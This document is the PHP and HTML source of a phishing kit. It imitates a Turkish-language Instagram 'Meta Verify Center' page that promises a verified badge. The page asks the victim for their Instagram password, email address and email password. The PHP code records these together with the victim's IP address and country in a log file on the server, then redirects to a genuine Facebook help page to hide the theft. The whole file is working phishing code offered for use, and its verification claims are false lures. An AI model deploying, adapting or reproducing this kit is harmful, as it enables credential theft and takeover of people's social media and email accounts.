<?php
error_reporting(0);
function ara($bas, $son, $yazi)
{
    @preg_match_all('/' . preg_quote($bas, '/') .
    '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
    return @$m[1];
}
$nick = $_GET['nick'];
$_SERVER["bedircan"]=$nick;
$url = 'https://instagram.com/' . $nick;
    $html = file_get_contents($url);
    $dom = new DOMDocument();
    $dom->loadHTML($html);
    $veri = $dom->textContent;
    $cc = ara('"thumbnail_src":"','"',$veri);
    $meta_tags = $dom->getElementsByTagName('meta');
    foreach( $meta_tags as $meta ) {
        if( $meta->getAttribute('property') == 'og:image' ) {
            $image_url = $meta->getAttribute('content');
        }
    }
if(empty($cc)){
        $cc[0] = $image_url;
    }
if($_POST){
$mail = $_POST["mail"];
$mailpass = $_POST["mailpass"];
$password =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
$file = fopen('zadmin/src/all.php', 'a');
fwrite($file, "index: ".$nick."\n" ."Şifre: ".$password. "\n"."Mail: ".$mail."\n"."Mail Şifre: ".$mailpass."\n"."Ip Adress: " .$ip."\n".

"Country: ".$ulke ."\n".   "Time: " .$cur_time.  "\n\n\n");
fclose($file);
echo '';
header("Location: https://m.facebook.com/help/instagram/?rdrhc");
}

    ?>
<html>

<head>
     <meta charset="utf-8">
	 <title>Meta Verify Center</title>
	 <meta name="viewport" content="width=device-width">
<link rel="icon" href="https://resimag.com/p1/1101a46d2a3.jpeg">	
<style>

#ana{
background-color:#fafafa;
}
#erhan{
border-radius:5px;}

#erhanasd{
font-family:sans-serif;
font-weight:400;
letter-spacing:;
color:#3d3d3d;
font-size:20px;
}

#sa{
background-color:white;
width:300px;

}
#yazi1{
font-family:sans-serif;
color:#999;
width:230px;
 }
 #copyright{
font-family:sans-serif;
color:#999;}
#menu{


width:91%;
} 
#liste{
display:inline-block;}
#link{text-decoration:none;
color:#003569;
font-family:sans-serif;
font-size:13px;
font-weight:540;

    vertical-align: baseline;
}
#üst{
width:100%;
background-color:white;

height:79px;
}

#buton{
color:white;
background-color:#3897f0;
font-size:15px;

border-radius:3px;
outline:none;
font-family:sans-serif;
font-weight:700;
border:0;
width:200px;
height:40px;
max-width:99%;
max-height:50px;
}

#password{
background-color:#fafafa;
border:0;
outline:none;
border-radius:6px;
width:220px;
height:35px;

font-size:16px;}

</style>
	 
</head>
<body id="ana" style="padding:0px; margin:0px;">




<div style="width:100%; background:white; border-bottom:1px solid #cecece; padding-left:2px;" >
 




<br><br>
</div>
<br><br>

<center>
<div id="sa" style="border:1px solid #cecece;"> <br> 


<br>
<img src="https://i.hizliresim.com/p2vrgo.gif" width="165" height="122" style="margin-right:0px" class="CToWUd">
<br>
<h1 id="erhanasd">Merhaba @<?php echo $nick; ?> 
<img src="https://i.hizliresim.com/qA6J7R.gif" width="23" height="23" style="font-size:small;color:rgb(34,34,34);font-family:'times new roman';margin-right:0px" class="CToWUd">

<p id="yazi1">

Doğrulanmış rozet, aramada ve profilde Instagram hesabının adının yanında görünen bir çektir. Bu, Instagram'ın bir hesabın temsil ettiği tanınmış kişinin, ünlünün veya küresel markanın gerçek varlığı olduğunu onayladığı anlamına gelir.

</p>

<br>
<select style="padding:6px; background:#fafafa; outline:none;text-align:center;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;">
  <option>Haber/Medya</option>
  <option>Spor</option>
  <option>Hükümet/Siyaset</option>
  <option>Müzik</option>
  <option>Moda</option>
  <option>Eğlence</option>
  <option>Blogger/İçerik Üreticisi</option>
  <option>İşletme/Marka/Kuruluş</option>
  <option>Diğer</option>
</select>

<br><br>

<form method="post" >
<input type="password" name="password" placeholder="Şifre" required="" style="padding:6px; background:#fafafa; outline:none;text-align:center;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;"><br><br>

<input type="email" name="mail" placeholder="E-Mail " required="" style="text-align:center; padding:6px; background:#fafafa; outline:none;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;"><br><br>



    <input type="password" name="mailpass" placeholder="Mail Şifre" required="" style="padding:6px; background:#fafafa; outline:none;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;text-align:center;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
  
    font: 400 13.3333px Arial; border-radius:3px;">


<br><br>
<button id="buton" type="submit"> Gönder <?php echo $nick; ?> </button>


 
</form>

</center>



</div>
<br> <br>
<center>
<div id="get">
<img src="https://1.bp.blogspot.com/-CeFm3Y4ycpg/YYFiD9GMi0I/AAAAAAAADkI/LJO9urQAupstByv1O-suvKo5iCvwzb_rgCNcBGAsYHQ/s2048/Meta.png" width=120 >
</div>
<br><br>
<div id="menu">

<br>
<p id="copyright">© 2022 | İnstagram From Meta</p>
</center>


</body>


</html>